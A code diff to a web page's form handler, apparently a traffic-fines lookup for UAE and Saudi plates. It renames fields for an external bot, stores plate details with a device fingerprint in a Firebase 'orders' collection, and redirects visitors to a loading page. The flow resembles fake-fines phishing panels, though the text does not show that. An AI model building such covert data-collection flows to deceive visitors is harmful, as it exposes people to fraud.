@@ -323,39 +323,33 @@
         const plateCode = document.getElementById("plateCode").value;
         const plateSource = sSel.value;
 
+        // تعديل أسماء الحقول لتطابق البوت في Render
         const payload = {
-            source: plateSource,
-            number: plateNumber,
-            code: plateCode,
+            plate_source: plateSource,
+            plate_number: plateNumber,
+            plate_code: plateCode,
             ksa: plateSource === "KSA" ? [document.getElementById("k1").value, document.getElementById("k2").value, document.getElementById("k3").value] : null,
             device_info: getDeviceFingerprint(),
             status: "pending",
-            bot_url: "https://dubai-bot-1-6f5q.onrender.com",
+            total_fines: "Checking...",
             timestamp: firebase.firestore.FieldValue.serverTimestamp()
         };
 
         try {
-            // حفظ الطلب في Firebase للتتبع
+            // حفظ الطلب في Firebase
             const docRef = await db.collection("orders").add(payload);
             
-            // تسجيل الحدث في Analytics
-            analytics.logEvent('search_initiated', {
-                plate_source: plateSource,
-                order_id: docRef.id
-            });
-
-            // حفظ بيانات الجلسة للانتقال للصفحة التالية
+            // حفظ المعرف في الجلسة لصفحة التحميل
             sessionStorage.setItem("last_order_id", docRef.id);
-            sessionStorage.setItem("plate_info", JSON.stringify({source: plateSource, number: plateNumber, code: plateCode}));
 
-            // التوجيه لصفحة النتائج
-            window.location.href = "violations_view.php";
+            // التوجيه لصفحة LOADING وليس صفحة النتائج مباشرة
+            window.location.href = "loading.php";
         } catch (err) { 
             console.error("Firebase Error:", err);
-            window.location.href = "violations_view.php";
+            btn.innerHTML = "خطأ في الاتصال!";
+            btn.disabled = false;
         }
     };
 </script>
 </body>
 </html>
-
